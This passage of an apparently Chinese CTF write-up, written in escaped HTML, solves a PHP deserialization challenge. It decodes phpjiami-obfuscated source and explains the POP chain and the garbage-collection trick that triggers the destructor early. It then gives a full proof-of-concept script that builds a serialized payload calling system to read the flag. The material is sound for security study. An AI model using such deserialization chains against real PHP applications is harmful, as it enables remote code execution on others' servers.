operator\">-&gt;</span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" Powered by PHP\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token comment\">//eval($this-&gt;a); ??? 吓得我赶紧把后门注释了</span>\n        <span class=\"token comment\">//echo \"???\";</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">F</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$s1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$s1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>而主页面本身是一段混淆之后的代码，查看源码发现是由<code>phpjiami</code>进行混淆的</p>\n<pre><code>https://github.com/wenshui2008/phpjiami_decode\n</code></pre>\n<p>由于phpjiami解密相对比较苛刻，少一个字符都会解密失败，可以采用脚本把混淆代码保存下来再解密</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$url</span> <span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"http://1.14.71.254:28706/login.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ch</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_setopt</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_setopt</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_COOKIE</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"PHPSESSID=00110b2656dbd4b5dd347f793e516da1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"pop.php\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>解密之后的文件为：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">Al</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$classname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">include</span> <span class=\"token variable\">$classname</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$o</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Error Format\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">spl_autoload_register</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Al'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$raw</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$o</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/Some/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$raw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$raw</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$o</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"SomeClass.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<h3><a id=\"POP_414\"></a>POP链构造</h3>\n<p>入口点在class E，die方法中是字符串处理，让a为对象会触发__toString方法</p>\n<p><img alt=\"image-20220704121614771\" src=\"image\\1a9bd97e89c6568cb8c1612acfe9ce05.png\"/></p>\n<p>接下来触发顺序为</p>\n<pre><code>B::__toString-&gt;a::see\n</code></pre>\n<p><img alt=\"image-20220704122417729\" src=\"image\\c242af64fecdbd6a2230a5e5d99fb2d3.png\"/></p>\n<p>在类A中，我们只需要令b为原生类，a参数和b参数都是可控的就可以rce了</p>\n<p>链子的触发点就是<code>1Nd3x_Y0u_N3v3R_Kn0W.php</code>文件，但是如果我们想把可以rce的文件包含进来，就要创建一个SomeClass类，而这里对<code>some</code>进行了过滤。</p>\n<p>我们只需要让<code>include $classname.\".php\"</code>将文件包含的同时直接进入那个destrust方法销毁，这里可以利用gc回收机制。我们将数组索引置为0，这样就会失去上一个对象的引用从而进入destrust。</p>\n<p>还有一种方法可以提前进入destrust，利用fastdestrust，传一个损坏的序列化数据，比如<code>O:6:\"person\":3:{s:4:\"name\";N;s:3:\"age\";i:19;s:3:\"sex\";N;</code>，把后面 <code>}</code>的符号去掉就行，但是这里有对序列化数据格式正确与否进行校验所以无法使用。</p>\n<p>POC：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">A</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">see</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$checker</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ReflectionClass</span><span class=\"token punctuation\">(</span><span class=\"token function\">get_class</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$checker</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getFileName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token string single-quoted-string\">'SomeClass.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">B</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">see</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">C</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"lock lock read!\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">D</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">learn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">E</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" Powered by PHP\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">F</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$s1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$s1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">SomeClass</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$e</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">E</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">B</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$e</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$arr</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//换其他原生类都行error啥的都可以</span>\n<span class=\"token variable\">$arr</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$arr</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"cat /nssctfflag\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$arr</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SomeClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"i:1;\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"i:0;\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>得到flag：</p>\n<p><img alt=\"image-20220704133253136\" src=\"image\\2d19ea54ece2b7eedba857f7fa940041.png\"/></p>\n<h2><a id=\"cmdbrowser_533\"></a>cmdbrowser</h2>\n<p>暂无复现途径</p>\n<p>参考：</p>\n<p>https://mp.weixin.qq.com/s/vTF9ArXKp4RCFQPl6mOGkA</p>\n<p>https://rce.moe/archives/</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}